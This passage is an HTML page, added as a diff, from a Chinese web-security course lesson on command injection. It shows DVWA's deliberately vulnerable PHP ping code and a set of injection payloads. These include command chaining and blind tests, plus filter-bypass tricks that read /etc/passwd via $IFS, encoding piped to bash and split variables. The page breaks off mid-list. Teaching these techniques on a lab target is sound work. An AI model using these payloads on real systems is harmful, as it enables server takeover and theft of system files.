@@ -1,0 +1,1028 @@
+<!DOCTYPE html><html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>14 | 命令与代码注入：常令安全人员半夜应急的漏洞</title>
+<style type="text/css">
+:root {
+    --control-text-color: #777;
+    --select-text-bg-color: rgba(223, 197, 223);  /*#7e66992e;*/
+    
+    /* side bar */
+    --side-bar-bg-color: rgb(255, 255, 255);
+    --active-file-text-color: #8163bd;
+    --active-file-bg-color: #E9E4F0;
+    --item-hover-bg-color: #E9E4F0;
+    --active-file-border-color: #8163bd;
+
+    --title-color: #6c549c;
+    --font-sans-serif: 'Ubuntu', 'Source Sans Pro', sans-serif !important;
+    --font-monospace: 'Fira Code', 'Roboto Mono', monospace !important;
+    --purple-1: #8163bd;
+    --purple-2: #79589F;
+    --purple-3: #fd5eb8;
+    --purple-light-1: rgba(99, 99, 172, .05);
+    --purple-light-2: rgba(99, 99, 172, .1);
+    --purple-light-3: rgba(99, 99, 172, .2);
+    --purple-light-4: rgba(129, 99, 189, .3);
+    --purple-light-5: #E9E4F0;
+    --purple-light-6: rgba(129, 99, 189, .8);
+}
+
+/* html {
+    font-size: 16px;
+} */
+
+body {
+    font-family: var(--font-sans-serif);
+    color: #34495e;
+    -webkit-font-smoothing: antialiased;
+    line-height: 1.6rem;
+    letter-spacing: 0;
+    margin: 0;
+    overflow-x: hidden;
+}
+
+/* 页边距 和 页面大小 */
+#write {
+    padding-left: 6ch;
+    padding-right: 6ch;
+    margin: 0 auto;
+}
+
+#write p {
+    line-height: 1.6rem;
+    word-spacing: .05rem;
+}
+
+#write ol li {
+    padding-left: 0.5rem;
+}
+
+#write > ul:first-child,
+#write > ol:first-child {
+    margin-top: 30px;
+}
+
+body > *:first-child {
+    margin-top: 0 !important;
+}
+
+body > *:last-child {
+    margin-bottom: 0 !important;
+}
+
+a {
+    color: var(--purple-1);
+    padding: 0 2px;
+    text-decoration: none;
+}
+.md-content {
+    color: var(--purple-light-6);
+}
+#write a {
+    border-bottom: 1px solid var(--purple-1);
+    color: var(--purple-1);
+    text-decoration: none;
+}
+
+h1,
+h2,
+h3,
+h4,
+h5,
+h6 {
+    position: relative;
+    margin-top: 1rem;
+    margin-bottom: 0.5rem;
+    /* font-weight: bold; */
+    font-weight: 500 !important;
+    line-height: 1.4;
+    cursor: text;
+    color: var(--title-color);
+    font-family: var(--font-sans-serif);
+}
+
+h1:hover a.anchor,
+h2:hover a.anchor,
+h3:hover a.anchor,
+h4:hover a.anchor,
+h5:hover a.anchor,
+h6:hover a.anchor {
+    text-decoration: none;
+}
+
+h1 tt,
+h1 code {
+    font-size: inherit !important;
+}
+h2 tt,
+h2 code {
+    font-size: inherit !important;
+}
+h3 tt,
+h3 code {
+    font-size: inherit !important;
+}
+h4 tt,
+h4 code {
+    font-size: inherit !important;
+}
+h5 tt,
+h5 code {
+    font-size: inherit !important;
+}
+h6 tt,
+h6 code {
+    font-size: inherit !important;
+}
+
+
+h1 {
+    padding-bottom: .4rem;
+    font-size: 2.2rem;
+    line-height: 1.3;
+}
+h1 {
+    text-align: center;
+    padding-bottom: 0.3em;
+    font-size: 2.2em;
+    line-height: 1.2;
+    margin: 2.4em auto 1.2em;
+}
+h1:after {
+    content: '';
+    display: block;
+    margin: 0.2em auto 0;
+    width: 100px;
+    height: 2px;
+    border-bottom: 2px solid var(--title-color);
+}
+
+h2 {
+    margin: 1.6em auto 0.5em;
+    padding-left: 10px;
+    line-height: 1.4;
+    font-size: 1.8em;
+    border-left: 9px solid var(--title-color);
+    border-bottom: 1px solid var(--title-color);
+}
+h3 {
+    font-size: 1.5rem;
+    margin: 1.2em auto 0.5em;
+}
+h4 {
+    font-size: 1.3rem;
+}
+h5 {
+    font-size: 1.2rem;
+}
+h6 {
+    font-size: 1.1rem;
+}
+
+p,
+blockquote,
+ul,
+ol,
+dl,
+table {
+    margin: 0.8em 0;
+}
+
+li > ol,
+li > ul {
+    margin: 0 0;
+}
+
+hr {
+    height: 2px;
+    padding: 0;
+    margin: 16px 0;
+    background-color: #e7e7e7;
+    border: 0 none;
+    overflow: hidden;
+    box-sizing: content-box;
+}
+
+body > h2:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h1:first-child + h2 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+body > h3:first-child,
+body > h4:first-child,
+body > h5:first-child,
+body > h6:first-child {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+a:first-child h1,
+a:first-child h2,
+a:first-child h3,
+a:first-child h4,
+a:first-child h5,
+a:first-child h6 {
+    margin-top: 0;
+    padding-top: 0;
+}
+
+h1 p,
+h2 p,
+h3 p,
+h4 p,
+h5 p,
+h6 p {
+    margin-top: 0;
+}
+
+li p.first {
+    display: inline-block;
+}
+
+ul,
+ol {
+    padding-left: 30px;
+}
+
+ul:first-child,
+ol:first-child {
+    margin-top: 0;
+}
+
+ul:last-child,
+ol:last-child {
+    margin-bottom: 0;
+}
+
+/* 引用 */
+blockquote {
+    /* margin-left: 1rem; */
+    border-left: 4px solid var(--purple-light-4);
+    padding: 10px 15px;
+    color: #777;
+    background-color: var(--purple-light-1);
+}
+
+/* 表格 */
+table {
+    padding: 0;
+    word-break: initial;
+}
+
+table tr {
+    border-top: 1px solid #dfe2e5;
+    margin: 0;
+    padding: 0;
+}
+
+/* 表格 背景色 */
+table tr:nth-child(2n),
+thead {
+    background-color: var(--purple-light-1);
+}
+#write table thead th {
+    background-color: var(--purple-light-2);
+}
+
+table tr th {
+    font-weight: bold;
+    border: 1px solid #dfe2e5;
+    border-bottom: 0;
+    text-align: left;
+    margin: 0;
+    padding: 6px 13px;
+}
+
+table tr td {
+    border: 1px solid #dfe2e5;
+    text-align: left;
+    margin: 0;
+    padding: 6px 13px;
+}
+
+table tr th:first-child,
+table tr td:first-child {
+    margin-top: 0;
+}
+
+table tr th:last-child,
+table tr td:last-child {
+    margin-bottom: 0;
+}
+
+/* 粗体 */
+#write strong {
+    padding: 0 2px;
+    color: var(--purple-1);
+}
+
+/* 斜体 */
+#write em {
+    padding: 0 5px 0 2px;
+    /* font-style: normal; */
+    color: #42b983;
+}
+
+/* inline code */
+#write code, tt {
+    padding: 2px 4px;
+    border-radius: 2px;
+    font-family: var(--font-monospace);
+    font-size: 0.92rem;
+    color: var(--purple-3); 
+    background-color: rgba(99, 99, 172, .05);
+}
+
+tt {
+    margin: 0 2px;
+}
+
+#write .md-footnote {
+    background-color: #f8f8f8;
+    color: var(--purple-3);
+}
+
+/* heighlight. */
+#write mark {
+    background-color: #fbd3ea;
+    border-radius: 2px;
+    padding: 2px 4px;
+    margin: 0 2px;
+}
+
+#write del {
+    padding: 1px 2px;
+}
+
+.md-task-list-item > input {
+    margin-left: -1.3em;
+}
+
+@media print {
+    html {
+        font-size: 0.9rem;
+    }
+
+    table,
+    pre {
+        page-break-inside: avoid;
+    }
+
+    pre {
+        word-wrap: break-word;
+    }
+}
+
+#write pre.md-meta-block {
+    padding: 1rem;
+    font-size: 85%;
+    line-height: 1.45;
+    background-color: #f7f7f7;
+    border: 0;
+    border-radius: 3px;
+    color: #777777;
+    margin-top: 0 !important;
+}
+
+.mathjax-block > .code-tooltip {
+    bottom: .375rem;
+}
+
+/* 图片 */
+.md-image > .md-meta {
+    border-radius: 3px;
+    font-family: var(--font-monospace);
+    padding: 2px 0 0 4px;
+    font-size: 0.9em;
+    color: inherit;
+}
+p .md-image:only-child{
+    width: auto;
+    text-align: left;
+    margin-left: 2rem;
+}
+.md-tag {
+    color: inherit;
+}
+/* 当 “![shadow-随便写]()”写时，会有阴影 */
+.md-image img[alt|='shadow'] {
+    /* box-shadow: 0 4px 24px -6px #ddd; */
+    box-shadow:var(--purple-light-2) 0px 10px 15px;
+}
+
+#write a.md-toc-inner {
+    line-height: 1.6;
+    white-space: pre-line;
+    border-bottom: none;
+    font-size: 0.9rem;
+}
+
+#typora-quick-open {
+    border: 1px solid #ddd;
+    background-color: #f8f8f8;
+}
+
+#typora-quick-open-item {
+    background-color: #FAFAFA;
+    border-color: #FEFEFE #e5e5e5 #e5e5e5 #eee;
+    border-style: solid;
+    border-width: 1px;
+}
+
+#md-notification:before {
+    top: 10px;
+}
+
+header,
+.context-menu,
+.megamenu-content,
+footer {
+    font-family: var(--font-sans-serif);
+}
+
+.file-node-content:hover .file-node-icon,
+.file-node-content:hover .file-node-open-state {
+    visibility: visible;
+}
+
+.md-lang {
+    color: #b4654d;
+}
+
+.html-for-mac .context-menu {
+    --item-hover-bg-color: #E6F0FE;
+}
+
+/* 代码框 */
+/* CodeMirror 3024 Day theme */
+
+/* 代码段 背景 */
+pre {
+    --select-text-bg-color: rgba(223, 197, 223) !important;
+    margin: .5em 0;
+    padding: 1em 1.4em;
+    border-radius: 8px;
+    background: #f6f8fa;
+    overflow-x: auto;
+    box-sizing: border-box;
+    font-size: 14px;
+}
+
+/* 边框 */
+.md-fences {
+    border: 1px solid #e7eaed;
+    border-radius: 3px;
+}
+
+.cm-s-inner {
+  padding: .25rem;
+  border-radius: .25rem;
+}
+
+.cm-s-inner.CodeMirror, .cm-s-inner .CodeMirror-gutters {
+  background-color: #f8f8f8 !important;
+  color: #3a3432 !important;
+  border: none;
+}
+
+.cm-s-inner .CodeMirror-gutters {
+  color: #6d8a88;
+}
+
+.cm-s-inner .CodeMirror-cursor {
+  border-left: solid thin #5c5855 !important;
+}
+
+.cm-s-inner .CodeMirror-linenumber {
+  color: #807d7c;
+}
+
+.cm-s-inner .CodeMirror-line::selection, .cm-s-inner .CodeMirror-line::-moz-selection,
+.cm-s-inner .CodeMirror-line > span::selection,
+.cm-s-inner .CodeMirror-line > span::-moz-selection,
+.cm-s-inner .CodeMirror-line > span > span::selection,
+.cm-s-inner .CodeMirror-line > span > span::-moz-selection {
+  background: var(--purple-light-2);
+}
+
+.cm-s-inner span.cm-comment {
+  color: #cdab53;
+}
+
+.cm-s-inner span.cm-string, .cm-s-inner span.cm-string-2 {
+  color: #f2b01d;
+}
+
+.cm-s-inner span.cm-number {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-variable {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-variable-2 {
+  color: #01a0e4;
+}
+
+.cm-s-inner span.cm-def {
+  /* color: #e8bbd0; */
+  color: #e2287f;
+}
+
+.cm-s-inner span.cm-operator {
+  color: #ff79c6;
+}
+
+.cm-s-inner span.cm-keyword {
+  color: #db2d20;
+}
+
+.cm-s-inner span.cm-atom {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-meta {
+  color: inherit;
+}
+
+.cm-s-inner span.cm-tag {
+  color: #db2d20;
+}
+
+.cm-s-inner span.cm-attribute {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-qualifier {
+  color: #388aa3;
+}
+
+.cm-s-inner span.cm-property {
+  color: #01a252;
+}
+
+.cm-s-inner span.cm-builtin {
+  color: #388aa3;
+}
+
+.cm-s-inner span.cm-variable-3, .cm-s-inner span.cm-type {
+  color: #ffb86c;
+}
+
+.cm-s-inner span.cm-bracket {
+  color: #3a3432;
+}
+
+.cm-s-inner span.cm-link {
+  color: #a34e8f;
+}
+
+.cm-s-inner span.cm-error {
+  background: #db2d20;
+  color: #5c5855;
+}
+
+/* .md-fences.md-focus .cm-s-inner .CodeMirror-activeline-background {
+  background: var(--purple-light-2);
+} */
+
+.cm-s-inner .CodeMirror-matchingbracket {
+  text-decoration: underline;
+  color: #a34e8f !important;
+}
+
+#fences-auto-suggest .active {
+  background: #ddd;
+}
+
+#write .code-tooltip {
+  bottom: initial;
+  top: calc(100% - 1px);
+  background: #f7f7f7;
+  border: 1px solid #ddd;
+  border-top: 0;
+}
+
+.auto-suggest-container {
+  border-color: #b4b4b4;
+}
+
+.auto-suggest-container .autoComplt-hint.active {
+  background: #b4b4b4;
+  color: inherit;
+}
+
+/* task list */
+#write .md-task-list-item > input {
+  -webkit-appearance: initial;
+  display: block;
+  position: absolute;
+  border: 1px solid #b4b4b4;
+  border-radius: .25rem;
+  margin-top: .1rem;
+  margin-left: -1.8rem;
+  height: 1.2rem;
+  width: 1.2rem;
+  transition: background 0.3s;
+}
+
+#write .md-task-list-item > input:focus {
+  outline: none;
+  box-shadow: none;
+}
+
+#write .md-task-list-item > input:hover {
+  background: #ddd;
+}
+
+#write .md-task-list-item > input[checked]::before {
+  content: '';
+  position: absolute;
+  top: 20%;
+  left: 50%;
+  height: 60%;
+  width: 2px;
+  transform: rotate(40deg);
+  background: #333;
+}
+
+#write .md-task-list-item > input[checked]::after {
+  content: '';
+  position: absolute;
+  top: 46%;
+  left: 25%;
+  height: 30%;
+  width: 2px;
+  transform: rotate(-40deg);
+  background: #333;
+}
+
+#write .md-task-list-item > p {
+  transition: color 0.3s, opacity 0.3s;
+}
+
+#write .md-task-list-item.task-list-done > p {
+  color: #b4b4b4;
+  text-decoration: line-through;
+}
+
+#write .md-task-list-item.task-list-done > p > .md-emoji {
+  opacity: .5;
+}
+
+#write .md-task-list-item.task-list-done > p > .md-link > a {
+  opacity: .6;
+}
+
+/* sidebar and outline */
+.pin-outline .outline-active {
+  color: var(--active-file-text-color); 
+}
+
+.file-list-item {
+    border-bottom: 1px solid;
+    border-color: var(--purple-light-5);
+}
+
+.file-list-item-summary {
+    font-weight: 400;
+}
+
+.file-list-item.active {
+    color: var(--active-file-text-color);
+    background-color: var(--purple-light-5);
+}
+
+.file-tree-node.active>.file-node-background {
+    background-color: var(--purple-light-5);
+    font-weight: 700;
+} 
+
+.file-tree-node.active>.file-node-content {
+    color: var(--active-file-text-color);
+    font-weight: 700;
+}
+
+.file-node-content {
+    color: #5e676d;
+}
+
+.sidebar-tabs {
+    border-bottom: none;
+}
+.sidebar-tab.active {
+    font-weight: 400;
+}
+
+.sidebar-content-content {
+    font-size: 0.9rem;
+}
+
+img {
+    max-width: 100%;
+}
+
+body {
+    background-color: rgb(237, 237, 237);
+}
+#content {
+    width: 836px;
+    padding: 50px;
+    background: #fff;
+    margin: 0 auto;
+}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/purple.css*/</style><style type="text/css">.hljs{display:block;overflow-x:auto;padding:.5em;color:#383a42;background:#fafafa}.hljs-comment,.hljs-quote{color:#a0a1a7;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#a626a4}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e45649}.hljs-literal{color:#0184bb}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#50a14f}.hljs-built_in,.hljs-class .hljs-title{color:#c18401}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#986801}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#4078f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}/*# sourceURL=/Users/young/Documents/Codes/Fun/lagou/public/atom-one-light.min.css*/</style></head>
+<body>
+  <div id="content"><h1>14 | 命令与代码注入：常令安全人员半夜应急的漏洞</h1><p data-nodeid="20329" class="">上一讲介绍了文件上传漏洞的攻防原理，利用可能直接控制服务器，危害严重。</p>
+<p data-nodeid="20330">本节课再给大家介绍一种叫命令注入的严重漏洞，由于它也能直接控制服务器，因此常令企业安全人员半夜应急。</p>
+<p data-nodeid="20331">为何是半夜呢？因为搞站的人经常是晚上下班后开搞，也专业挑安全人员下班的时间，减少被发现和阻断的情况。</p>
+<h3 data-nodeid="20332">命令注入漏洞成因</h3>
+<p data-nodeid="20333">命令注入，主要指应用在服务器或客户端上，允许拼接系统命令并执行而造成的漏洞。对于 web 网站，通常是针对服务器的攻击利用。</p>
+<p data-nodeid="20334">PHP 中常见的系统命令执行函数有：</p>
+<ul data-nodeid="20335">
+<li data-nodeid="20336">
+<p data-nodeid="20337">system()</p>
+</li>
+<li data-nodeid="20338">
+<p data-nodeid="20339">exec()</p>
+</li>
+<li data-nodeid="20340">
+<p data-nodeid="20341">shell_ exec()</p>
+</li>
+<li data-nodeid="20342">
+<p data-nodeid="20343">proc_open()</p>
+</li>
+<li data-nodeid="20344">
+<p data-nodeid="20345">popen()</p>
+</li>
+<li data-nodeid="20346">
+<p data-nodeid="20347">passthru()</p>
+</li>
+<li data-nodeid="20348">
+<p data-nodeid="20349">……</p>
+</li>
+</ul>
+<p data-nodeid="20350">如果外部用户的输入数据（如 GET、POST、Cookie 等数据）未做任何过滤或转义，直接转递给上述命令执行函数，就会造成命令注入漏洞。</p>
+<p data-nodeid="20351">总结下形成命令注入漏洞的条件：</p>
+<ul data-nodeid="20352">
+<li data-nodeid="20353">
+<p data-nodeid="20354">内部存在命令执行函数的调用</p>
+</li>
+<li data-nodeid="20355">
+<p data-nodeid="20356">用户输入数据作为参数传递给命令执行函数</p>
+</li>
+<li data-nodeid="20357">
+<p data-nodeid="20358">输入参数未做任何过滤或转义</p>
+</li>
+</ul>
+<h3 data-nodeid="20359">漏洞利用实战</h3>
+<h4 data-nodeid="20360">1.命令拼接技巧</h4>
+<p data-nodeid="20361">注入命令过程中，常常需要使用一些系统命令的拼接方式，以达到更多复杂功能的实现，尤其是存在限制的情况，运用好可用来绕过限制。</p>
+<p data-nodeid="20362">常用拼接符号如下。</p>
+<ul data-nodeid="20363">
+<li data-nodeid="20364">
+<p data-nodeid="20365"><strong data-nodeid="20523">&amp;&amp;</strong></p>
+</li>
+</ul>
+<p data-nodeid="20366">命令格式：cmd1 &amp;&amp; cmd2，cmd1 执行成功后才会执行 cmd2。</p>
+<ul data-nodeid="20367">
+<li data-nodeid="20368">
+<p data-nodeid="20369"><strong data-nodeid="20531">|</strong></p>
+</li>
+</ul>
+<p data-nodeid="20370">命令格式：cmd1 | cmd2，cmd1 的执行结果传递给 cmd2 去执行。</p>
+<ul data-nodeid="20371">
+<li data-nodeid="20372">
+<p data-nodeid="20373"><strong data-nodeid="20539">||</strong></p>
+</li>
+</ul>
+<p data-nodeid="20374">命令格式：cmd1 || cmd2，cmd1 执行失败后就执行 cmd2。</p>
+<ul data-nodeid="20375">
+<li data-nodeid="20376">
+<p data-nodeid="20377"><strong data-nodeid="20547">&amp;</strong></p>
+</li>
+</ul>
+<p data-nodeid="20378">命令格式：cmd1 &amp; cmd2，&amp; 用于分隔多个命令，命令按顺序 cmd1、cmd2 执行。</p>
+<ul data-nodeid="20379">
+<li data-nodeid="20380">
+<p data-nodeid="20381"><strong data-nodeid="20556">;</strong></p>
+</li>
+</ul>
+<p data-nodeid="20382">命令格式：cmd1 ; cmd2，分号用于分隔多个命令去执行，命令按顺序 cmd1、cmd2 执行。</p>
+<ul data-nodeid="20383">
+<li data-nodeid="20384">
+<p data-nodeid="20385"><strong data-nodeid="20562">\`\`</strong></p>
+</li>
+</ul>
+<p data-nodeid="20386">命令格式：<code data-backticks="1" data-nodeid="20564">cmd</code>，注意这里是对反斜号，代表命令执行结果的输出，即命令替换。</p>
+<ul data-nodeid="20387">
+<li data-nodeid="20388">
+<p data-nodeid="20389"><strong data-nodeid="20569">$()</strong></p>
+</li>
+</ul>
+<p data-nodeid="20390">命令格式：$(cmd)，用于命令替换，适用于 cmd 中需要使用多个拼接符。</p>
+<ul data-nodeid="20391">
+<li data-nodeid="20392">
+<p data-nodeid="20393"><strong data-nodeid="20574">()</strong></p>
+</li>
+</ul>
+<p data-nodeid="20394">命令格式：(cmd1;cmd2)，合并多个命令，重新开启子 shell 来执行命令。</p>
+<ul data-nodeid="20395">
+<li data-nodeid="20396">
+<p data-nodeid="20397"><strong data-nodeid="20579">{}</strong></p>
+</li>
+</ul>
+<p data-nodeid="20398">命令格式：{cmd,arg}，Linux bash 下用于合并多个命令及参数，在当前 shell 执行。</p>
+<h4 data-nodeid="20399">2.靶场演练</h4>
+<p data-nodeid="20400">以 DVWA 靶场的命令注入题目为例，漏洞代码如下。</p>
+<pre class="lang-php" data-nodeid="20401"><code data-language="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(&nbsp;<span class="hljs-keyword">isset</span>(&nbsp;$_POST[&nbsp;<span class="hljs-string">'Submit'</span>&nbsp;]&nbsp;&nbsp;)&nbsp;)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Get&nbsp;input</span>
+&nbsp;&nbsp;&nbsp;&nbsp;$target&nbsp;=&nbsp;$_REQUEST[&nbsp;<span class="hljs-string">'ip'</span>&nbsp;];
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Determine&nbsp;OS&nbsp;and&nbsp;execute&nbsp;the&nbsp;ping&nbsp;command.</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">if</span>(&nbsp;stristr(&nbsp;php_uname(&nbsp;<span class="hljs-string">'s'</span>&nbsp;),&nbsp;<span class="hljs-string">'Windows&nbsp;NT'</span>&nbsp;)&nbsp;)&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Windows</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;shell_exec(&nbsp;<span class="hljs-string">'ping&nbsp;&nbsp;'</span>&nbsp;.&nbsp;$target&nbsp;);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">else</span>&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;*nix</span>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$cmd&nbsp;=&nbsp;shell_exec(&nbsp;<span class="hljs-string">'ping&nbsp;&nbsp;-c&nbsp;4&nbsp;'</span>&nbsp;.&nbsp;$target&nbsp;);
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-comment">//&nbsp;Feedback&nbsp;for&nbsp;the&nbsp;end&nbsp;user</span>
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="hljs-keyword">echo</span>&nbsp;<span class="hljs-string">"&lt;pre&gt;{$cmd}&lt;/pre&gt;"</span>;
+}
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p data-nodeid="20402">它在获取用户输入的 IP 地址后直接传递给 shell_exec 函数去执行，如果我们利用前面介绍的命令拼接方式去注入其他命令就可以被执行，比如通过分号输入以下命令：</p>
+<pre class="lang-java" data-nodeid="20403"><code data-language="java"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; id
+</code></pre>
+<p data-nodeid="20404">提交后可以看到 id 命令的执行结果，说明命令注入成功。</p>
+<p data-nodeid="20405"><img src="https://s0.lgstatic.com/i/image2/M01/0A/A9/Cip5yGASiyeAblmvAAYSmm7bGoE695.png" alt="图片1.png" data-nodeid="20589"></p>
+<div data-nodeid="20406"><p style="text-align:center">图 1  利用漏洞执行命令 id</p></div>
+<p data-nodeid="20407">其他连接符号的利用，你也可以尝试下。</p>
+<p data-nodeid="20408">此处是有回显内容的，若无回显就需要使用一些盲注技巧，比如 sleep 延时命令：</p>
+<pre data-nodeid="20409"><code>127.0.0.1 &amp;&amp; sleep 5
+</code></pre>
+<p data-nodeid="20410">也可使用输出重定向符号“&gt;”与“&gt;&gt;”，输出内容到指定文件，然后访问对应文件是否存在，比如：</p>
+<pre class="lang-java" data-nodeid="20411"><code data-language="java"><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; echo <span class="hljs-string">"test"</span> &gt; test.txt (由于靶场环境限制无法在网站根目录创建文件，所以此用例不会成功)
+<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>; echo <span class="hljs-string">'test'</span>&gt;/app/hackable/uploads/text.txt
+提交上述用例后，访问http:<span class="hljs-comment">//127.0.0.1/hackable/uploads/text.txt即可看到输出成功</span>
+</code></pre>
+<p data-nodeid="20412">执行效果如图 2 所示。<br>
+<img src="https://s0.lgstatic.com/i/image2/M01/0A/AB/CgpVE2ASizuAFANhAAF--IPq7VM659.png" alt="图片2.png" data-nodeid="20597"></p>
+<div data-nodeid="20413"><p style="text-align:center">图 2  注入命令写文件成功</p></div>
+<p data-nodeid="20414">还有访问自己的服务器，看日志判断是否命令执行成功，比较便捷的方式就是使用 BurpSuit Collaborator ，在诸多盲注场景下它都适用。</p>
+<h4 data-nodeid="20415">3.常用的限制绕过技巧</h4>
+<p data-nodeid="20416"><strong data-nodeid="20603">（1）绕过单命令限制</strong></p>
+<p data-nodeid="20417">命令注入点有时是某一执行程序的参数，比如 ls 命令，注入再多的参数也难达到控制服务器的目的，此时我们就需要采用多命令注入方式，你可以回头再看下刚刚讲的命令拼接技巧中介绍的各种方法。</p>
+<p data-nodeid="20418"><strong data-nodeid="20608">（2）空格绕过</strong></p>
+<p data-nodeid="20419">有时会遇到对输入命令参数进行空格过滤，比如输入命令：</p>
+<pre class="lang-java" data-nodeid="20420"><code data-language="java">cat /etc/passwd;
+</code></pre>
+<p data-nodeid="20421">就会变成：</p>
+<pre class="lang-java" data-nodeid="20422"><code data-language="java">cat/etc/passwd;
+</code></pre>
+<p data-nodeid="20423">导致执行失败。<br>
+你可以尝试以下几种方法去绕过。</p>
+<ul data-nodeid="20424">
+<li data-nodeid="20425">
+<p data-nodeid="20426"><strong data-nodeid="20617">IFS 分隔符</strong></p>
+</li>
+</ul>
+<p data-nodeid="20427">IFS（Internal Field Seperator，内部域分隔符）是 shell 下的特殊环境变量，可以是空格、Tab、换行符或者其他自定义符号，如图 3 利用 IFS 分隔符成功读取到敏感文件。</p>
+<pre class="lang-java" data-nodeid="20428"><code data-language="java">cat$IFS/etc/passwd
+</code></pre>
+<p data-nodeid="20429"><img src="https://s0.lgstatic.com/i/image/M00/92/BF/CgqCHmASi1CATWHbAARYJuJkPEw289.png" alt="图片3.png" data-nodeid="20621"></p>
+<div data-nodeid="20430"><p style="text-align:center">图 3  利用 IFS 分隔符绕过空格限制</p></div>
+<ul data-nodeid="20431">
+<li data-nodeid="20432">
+<p data-nodeid="20433"><strong data-nodeid="20625">URL 编码</strong></p>
+</li>
+</ul>
+<p data-nodeid="20434">可以在请求参数中用 ％20、+、%09(tab) 等方式来绕过：</p>
+<pre class="lang-java" data-nodeid="20435"><code data-language="java">cat%<span class="hljs-number">20</span>/etc/passwd
+cat+/etc/passwd
+cat%<span class="hljs-number">09</span>/etc/passwd
+</code></pre>
+<ul data-nodeid="20436">
+<li data-nodeid="20437">
+<p data-nodeid="20438"><strong data-nodeid="20630">{cmd,arg}</strong></p>
+</li>
+</ul>
+<p data-nodeid="20439">在 Linux bash 环境中可以使用花括号 {cmd,arg} 扩展来绕过：</p>
+<pre class="lang-java" data-nodeid="20440"><code data-language="java">{cat,etc/passwd}
+</code></pre>
+<p data-nodeid="20441">这个依赖 bash 环境，并不是那么通用的方式，比如在 DVWA 靶场中就不适用。<br>
+<strong data-nodeid="20637">（3）黑名单绕过</strong></p>
+<p data-nodeid="20442">绕过黑名单就是先探测哪些是黑名单，尽量避开不用，如果还不行可以考虑以下方法。</p>
+<ul data-nodeid="20443">
+<li data-nodeid="20444">
+<p data-nodeid="20445"><strong data-nodeid="20642">shell 特殊变量</strong></p>
+</li>
+</ul>
+<p data-nodeid="20446">先看下 shell 中的一些特殊变量：</p>
+<p data-nodeid="20447"><img src="https://s0.lgstatic.com/i/image/M00/92/B4/Ciqc1GASi7mASyv4AAFgvRQXlzo668.png" alt="图片5.png" data-nodeid="20646"><br>
+比如 cat 命令被禁，利用上述特殊变量，我们就可以这样构造来绕过：</p>
+<pre class="lang-java" data-nodeid="20448"><code data-language="java">ca$<span class="hljs-number">1</span>t /etc/passwd
+cat$*t /etc/passwd
+ca$<span class="hljs-meta">@t</span> /etc/passwd
+</code></pre>
+<ul data-nodeid="20449">
+<li data-nodeid="20450">
+<p data-nodeid="20451"><strong data-nodeid="20652">编码绕过</strong></p>
+</li>
+</ul>
+<p data-nodeid="20452">直接将命令字符串转换成 URL 编码、hex 码、base 64 等编码，再转换回来执行：</p>
+<pre class="lang-shell" data-nodeid="20453"><code data-language="shell"><span class="hljs-meta">#</span><span class="bash"> Base64编码命令“cat /etc/passwd”</span>
+echo "Y2F0IC9ldGMvcGFzc3dk"|base64 -d|bash
+<span class="hljs-meta">#</span><span class="bash"> Hex编码命令“cat /etc/passwd”</span>
+echo "636174202f6574632f706173737764"|xxd -r -p|bash
+<span class="hljs-meta">$</span><span class="bash">(<span class="hljs-built_in">printf</span> <span class="hljs-string">"\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"</span>)</span>
+<span class="hljs-meta">#</span><span class="bash"> URL编码</span>
+<span class="hljs-meta">cat%</span><span class="bash">20%2Fetc%2Fpasswd</span>
+</code></pre>
+<ul data-nodeid="20454">
+<li data-nodeid="20455">
+<p data-nodeid="20456"><strong data-nodeid="20657">变量自定义</strong></p>
+</li>
+</ul>
+<p data-nodeid="20457">将黑名单内容拆分到不同的变量，再拼接起来执行。</p>
+<pre class="lang-java" data-nodeid="20458"><code data-language="java">a=c;b=at;c=<span class="hljs-string">"/etc/passwd"</span>;$a$b $c
+</code></pre>
+<ul data-nodeid="20459">
+<li data-nodeid="20460">
